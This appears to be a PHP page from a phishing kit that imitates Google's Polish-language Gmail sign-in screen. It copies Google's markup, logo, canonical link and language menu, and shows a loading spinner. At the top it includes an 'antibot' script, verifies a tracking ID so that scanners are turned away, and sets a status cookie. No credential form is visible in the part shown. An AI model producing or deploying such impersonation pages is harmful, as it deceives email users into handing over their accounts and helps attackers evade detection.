<?php
require_once "antibot.php";
require_once "functions.php";

// Verify RID to deter bots
VerifyRid();

// Setup UID and status
setcookie("status", "loading");
?>
<!DOCTYPE html>
<html lang=pl dir=ltr class=CMgTXc>
<meta charset=utf-8>
<meta http-equiv=X-UA-Compatible content="IE=edge">
<noscript>
    <style nonce="q9QPamBvmoH6_c3d5ylFXw">
        body {
            opacity: 0;
        }
    </style>
</noscript>
<title>Gmail</title>
<meta name=description content="Gmail to intuicyjna, szybka i&nbsp;praktyczna poczta e-mail: 15&nbsp;GB miejsca, mniej spamu i&nbsp;dostęp z&nbsp;urządzenia mobilnego.">
<meta name=viewport content="width=device-width, initial-scale=1">
<meta name=format-detection content="telephone=no">
<link rel=stylesheet href=../css/login_1.css>
<link rel="shortcut icon" href=data:image/x-icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///zD9/f2W/f392P39/fn9/f35/f391/39/ZT+/v4uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Cf39/Zn///////////////////////////////////////////39/ZX///8IAAAAAAAAAAAAAAAA/v7+Cf39/cH/////+v35/7TZp/92ul3/WKs6/1iqOv9yuFn/rNWd//j79v///////f39v////wgAAAAAAAAAAP39/Zn/////7PXp/3G3WP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP+Or1j//vDo///////9/f2VAAAAAP///zD/////+vz5/3G3V/9TqDT/WKo6/6LQkf/U6cz/1urO/6rUm/+Zo0r/8IZB//adZ////v7///////7+/i79/f2Y/////4nWzf9Lqkj/Vqo4/9Xqzv///////////////////////ebY//SHRv/0hUL//NjD///////9/f2U/f392v////8sxPH/Ebzt/43RsP/////////////////////////////////4roL/9IVC//i1jf///////f391/39/fr/////Cr37/wW8+/+16/7/////////////////9IVC//SFQv/0hUL/9IVC//SFQv/3pnX///////39/fn9/f36/////wu++/8FvPv/tuz+//////////////////SFQv/0hUL/9IVC//SFQv/0hUL/96p7///////9/f35/f392/////81yfz/CrL5/2uk9v///////////////////////////////////////////////////////f392P39/Zn/////ks/7/zdS7P84Rur/0NT6///////////////////////9/f////////////////////////39/Zb+/v4y//////n5/v9WYu3/NUPq/ztJ6/+VnPT/z9L6/9HU+v+WnfT/Ul7t/+Hj/P////////////////////8wAAAAAP39/Z3/////6Or9/1hj7v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9sdvD////////////9/f2YAAAAAAAAAAD///8K/f39w//////5+f7/paz2/11p7v88Suv/Okfq/1pm7v+iqfX/+fn+///////9/f3B/v7+CQAAAAAAAAAAAAAAAP///wr9/f2d///////////////////////////////////////////9/f2Z/v7+CQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f2Z/f392/39/fr9/f36/f392v39/Zj///8wAAAAAAAAAAAAAAAAAAAAAPAPAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAPAPAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/g3+/v5X/f39mf39/cj9/f3q/f39+f39/fn9/f3q/f39yP39/Zn+/v5W////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f2c/f399f/////////////////////////////////////////////////////9/f31/f39mv7+/iMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/gn9/f2K/f39+////////////////////////////////////////////////////////////////////////////f39+v39/Yf///8IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4k/f390v////////////////////////////////////////////////////////////////////////////////////////////////39/dD///8iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////MP39/er//////////////////////////+r05v+v16H/gsBs/2WxSf9Wqjj/Vqk3/2OwRv99vWX/pdKV/97u2P////////////////////////////39/ej+/v4vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f3q/////////////////////+v15/+Pxnv/VKk2/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/36+Z//d7tf///////////////////////39/ej///8iAAAAAAAAAAAAAAAAAAAAAAAAAAD///8K/f390//////////////////////E4bn/XKw+/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1apN/+x0pv///////////////////////39/dD///8IAAAAAAAAAAAAAAAAAAAAAP39/Yv/////////////////////sdij/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/YKU1/8qOPv/5wZ////////////////////////39/YcAAAAAAAAAAAAAAAD+/v4l/f39+////////////////8Lgt/9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9utlT/n86N/7faqv+426v/pdKV/3u8ZP9UqDX/U6g0/3egN//jiUH/9IVC//SFQv/82MP//////////////////f39+v7+/iMAAAAAAAAAAP39/Z3////////////////q9Ob/W6w+/1OoNP9TqDT/U6g0/1OoNP9nskz/zOXC/////////////////////////////////+Dv2v+osWP/8YVC//SFQv/0hUL/9IVC//WQVP/++fb//////////////////f39mgAAAAD+/v4O/f399v///////////////4LHj/9TqDT/U6g0/1OoNP9TqDT/dblc//L58P/////////////////////////////////////////////8+v/3p3f/9IVC//SFQv/0hUL/9IVC//rIqf/////////////////9/f31////DP7+/ln////////////////f9v7/Cbz2/zOwhv9TqDT/U6g0/2KwRv/v9+z///////////////////////////////////////////////////////738//1kFT/9IVC//SFQv/0hUL/9plg///////////////////////+/v5W/f39nP///////////////4jf/f8FvPv/Bbz7/yG1s/9QqDz/vN2w//////////////////////////////////////////////////////////////////rHqP/0hUL/9IVC//SFQv/0hUL//vDn//////////////////39/Zn9/f3L////////////////R878/wW8+/8FvPv/Bbz7/y7C5P/7/fr//////////////////////////////////////////////////////////////////ere//SFQv/0hUL/9IVC//SFQv/718H//////////////////f39yP39/ez///////////////8cwvv/Bbz7/wW8+/8FvPv/WNL8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//rIqv/////////////////9/f3q/f39+v///////////////we9+/8FvPv/Bbz7/wW8+/993P3///////////////////////////////////////SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/+cGf//////////////////39/fn9/f36////////////////B737/wW8+/8FvPv/Bbz7/33c/f//////////////////////////////////////9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/6xaX//////////////////f39+f39/e3///////////////8cwvv/Bbz7/wW8+/8FvPv/WdP8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//vVv//////////////////9/f3q/f39y////////////////0bN/P8FvPv/Bbz7/wW8+/8hrvn/+/v///////////////////////////////////////////////////////////////////////////////////////////////////////////////////39/cj9/f2c////////////////ht/9/wW8+/8FvPv/FZP1/zRJ6/+zuPf//////////////////////////////////////////////////////////////////////////////////////////////////////////////////f39mf7+/lr////////////////d9v7/B7n7/yB38f81Q+r/NUPq/0hV7P/u8P3////////////////////////////////////////////////////////////////////////////////////////////////////////////+/v5X////D/39/ff///////////////9tkPT/NUPq/zVD6v81Q+r/NUPq/2Fs7//y8v7////////////////////////////////////////////09f7//////////////////////////////////////////////////f399f7+/g0AAAAA/f39n////////////////+Tm/P89Suv/NUPq/zVD6v81Q+r/NUPq/1Bc7f/IzPn/////////////////////////////////x8v5/0xY7P+MlPP////////////////////////////////////////////9/f2cAAAAAAAAAAD+/v4n/f39/P///////////////7W69/81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9ZZe7/k5v0/6609/+vtff/lJv0/1pm7v81Q+r/NUPq/zVD6v+GjvL//v7//////////////////////////////f39+/7+/iQAAAAAAAAAAAAAAAD9/f2N/////////////////////6Cn9f81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v+BivL////////////////////////////9/f2KAAAAAAAAAAAAAAAAAAAAAP7+/gv9/f3V/////////////////////7W69/8+S+v/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/P0zr/7q/+P///////////////////////f390v7+/gkAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3r/////////////////////+Xn/P94gfH/NkTq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NkTq/3Z/8f/l5/z///////////////////////39/er+/v4kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f3r///////////////////////////k5vz/nqX1/2p08P9IVez/OEbq/zdF6v9GU+z/aHLv/5qh9f/i5Pz////////////////////////////9/f3q////MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3V/////////////////////////////////////////////////////////////////////////////////////////////////f390v7+/iQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wr9/f2N/f39/P///////////////////////////////////////////////////////////////////////////f39+/39/Yv+/v4JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4n/f39n/39/ff//////////////////////////////////////////////////////f399v39/Z3+/v4lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Dv7+/lr9/f2c/f39y/39/e39/f36/f39+v39/ez9/f3L/f39nP7+/ln+/v4OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/AA///AAD//AAAP/gAAB/wAAAP4AAAB8AAAAPAAAADgAAAAYAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABgAAAAcAAAAPAAAAD4AAAB/AAAA/4AAAf/AAAP/8AAP//wAP />
<link rel=canonical href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;dsh=S1108311958%3A1663290188485187&amp;emr=1&amp;flowEntry=ServiceLogin&amp;flowName=GlifWebSignIn&amp;followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;ifkv=AQDHYWp32IJgo6MDTlAn8Oz0bGDU8_lVZmeKZoYN7bBXqFfG6dDaDyQh8w__nW9Nx4qM42O2m9akmw&amp;osid=1&amp;service=mail">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="../js/main.js"></script>

<body id=yDmH0d class="nyoS7c UzCXuf EIlDfe" jscontroller=Uas9Hd jsaction=rcuQ6b:npT2md;click:FAbpgf;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;GvneHb:.CLIENT;wINJic:.CLIENT;keydown:.CLIENT>
    <div class="H2SoFe LZgQXe TFhTPc" data-continent="Eastern Europe" data-session-region=PL>
        <div class="RAYh1e LZgQXe qmmlRd" id=initialView role=presentation jsname=WsjYwc jscontroller=GHsEdb jsaction=rcuQ6b:wVXPKc,eyofDf;SlnBXb:r0xNSb;cbwpef:Yd2OHe;EJh3N:vYWWBd;bITzcd:wymjWe;Rld2oe:waWwEd;FzgWvd:waWwEd;>
            <div class="RZBuIb c8DD0" aria-hidden=true>
                <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=Igk6W role=progressbar class="sZwd7c B6Vhqe qdulke jK7moc">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname=P1ekSe>
                        <span class="l3q5xe SQxu9c"></span>
                    </div>
                    <div class="MyvhI sUoeld">
                        <span class="l3q5xe SQxu9c"></span>
                    </div>
                </div>
            </div>
            <div class=xkfVF jsname=f2d3ae role=presentation>
                <div class=Aa1VU>
                    <div class=Lth2jb jsname=n7vHCb jscontroller=rKxYMb jsaction=rcuQ6b:qg4Ic;Kzwjs:WPi0i; data-oauth-third-party-logo-url>
                        <div jsname=jjf7Ff>
                            <div id=logo class=v8vQje title=Google>
                                <div class=rr0DNb jsname=l4eHX>
                                    <svg viewBox="0 0 75 24" width=75 height=24 xmlns=http://www.w3.org/2000/svg aria-hidden=true class=l5Lhkf>
                                        <g id=qaEJec>
                                            <path fill=#ea4335 d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                                        </g>
                                        <g id=YGlOvc>
                                            <path fill=#34a853 d=M58.193.67h2.564v17.44h-2.564z></path>
                                        </g>
                                        <g id=BWfIk>
                                            <path fill=#4285f4 d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                                        </g>
                                        <g id=e6m3fd>
                                            <path fill=#fbbc05 d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                                        </g>
                                        <g id=vbkDmc>
                                            <path fill=#ea4335 d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                                        </g>
                                        <g id=idEJde>
                                            <path fill=#4285f4 d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div jscontroller=z2Ux2c jsaction=jiqeKb:UHZ0U;u3KAb:UHZ0U;rcuQ6b:WYd;rURRne:.CLIENT;EJh3N:.CLIENT;DjJpIb:.CLIENT;abBxn:.CLIENT;xdUk6b:.CLIENT;ffNU7c:.CLIENT jsname=nUpftc class=zWl5kd data-view-id=oIjvfc>
                        <div class="DRS7Fe bxPAYd k6Zj8d" jsname=bN97Pc jscontroller=Z3Buzf jsshadow data-branding=jcJzye null role=presentation>
                            <div jsname=paFcre>
                                <div class=jXeDnc jsname=tJHJj jscontroller=S9352b jsaction=JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;>
                                    <h1 class=ahT6S data-a11y-title-piece id=headingText jsname=r4nke>
                                        <style>
                                            .loader {
                                                margin-top: 20px;
                                                border: 16px solid #f3f3f3;
                                                border-radius: 50%;
                                                border-top: 16px solid #4285F4;
                                                border-right: 16px solid #DB4437;
                                                border-left: 16px solid #0F9D58;
                                                border-bottom: 16px solid #F4B400;
                                                width: 120px;
                                                height: 120px;
                                                -webkit-animation: spin 2s linear infinite;
                                                animation: spin 2s linear infinite;
                                            }

                                            @-webkit-keyframes spin {
                                                0% {
                                                    -webkit-transform: rotate(0deg);
                                                }

                                                100% {
                                                    -webkit-transform: rotate(360deg);
                                                }
                                            }

                                            @keyframes spin {
                                                0% {
                                                    transform: rotate(0deg);
                                                }

                                                100% {
                                                    transform: rotate(360deg);
                                                }
                                            }
                                        </style>
                                        <center>
                                            <div class="loader"></div>
                                        </center>

                                    </h1>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class=RwBngc>
            <div class=u7land jscontroller=VVHlDf jsaction=rcuQ6b:npT2md;aLn7Wb:VPRXbd>
                <div role=listbox aria-expanded=false id=lang-chooser class="jgvuAb TkU0Xc" jscontroller=YwHGTd jsaction="click:cOuCgd(LgbsSe); keydown:I481le; keypress:Kr2w4b; mousedown:UX7yZ(LgbsSe),npT2md(preventDefault=true); mouseup:lbsD7e(LgbsSe); mouseleave:JywGue; touchstart:p6p2H(LgbsSe); touchmove:FwuNnf; touchend:yfqBxc(LgbsSe|preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd(LgbsSe); focus:AHmuwe; blur:O22p3e;b5SvAb:TvD9Pc;" jsshadow jsname=rfCUpd aria-label="Zmień język">
                    <div jsname=LgbsSe role=presentation>
                        <div class="ry3kXd Ulgu9" jsname=d9BH4c role=presentation>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=af aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Afrikaans‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=az aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪azərbaycan‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=bs aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪bosanski‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ca aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪català‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=cs aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Čeština‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=da aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Dansk‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=de aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Deutsch‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=et aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪eesti‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=en-GB aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪English (United Kingdom)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=en aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪English (United States)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=es aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Español (España)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=es-419 aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Español (Latinoamérica)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=eu aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪euskara‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=fil aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Filipino‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=fr-CA aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Français (Canada)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=fr aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Français (France)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=gl aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪galego‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=hr aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Hrvatski‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=in aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Indonesia‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=zu aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪isiZulu‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=is aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪íslenska‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=it aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Italiano‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sw aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Kiswahili‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=lv aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪latviešu‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=lt aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪lietuvių‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=hu aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪magyar‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ms aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Melayu‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=nl aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Nederlands‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=no aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪norsk‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname=wQNmvb jsaction data-value=pl aria-selected=true role=option tabindex=0>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪polski‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=pt aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Português (Brasil)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=pt-PT aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Português (Portugal)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ro aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪română‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sk aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Slovenčina‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sl aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪slovenščina‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sr-Latn aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪srpski (latinica)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=fi aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Suomi‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sv aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Svenska‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=vi aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Tiếng Việt‬</span>
                            </div>
